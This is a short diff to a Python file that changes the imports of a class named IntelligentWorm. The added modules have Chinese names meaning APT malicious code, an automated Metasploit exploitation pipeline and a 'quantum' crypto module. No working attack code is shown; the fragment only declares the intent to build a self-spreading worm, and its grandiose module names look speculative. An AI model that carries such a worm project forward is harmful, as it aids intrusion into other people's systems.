@@ -32,10 +32,11 @@ import inspect
 import subprocess
 import re
 from collections import deque
-from 模仿人类的思考方式 import HumanLikeThinker
+from 思考模块 import HumanLikeThinker
 from 自动写代码 import AutoCoder
-
 from APT恶意代码 import APTModule
+from 全自动化漏洞流程metasploit import MetaAutoPwn
+from 量子模块 import HybridQuantumCrypto
 
 class IntelligentWorm:
     def __init__(self):
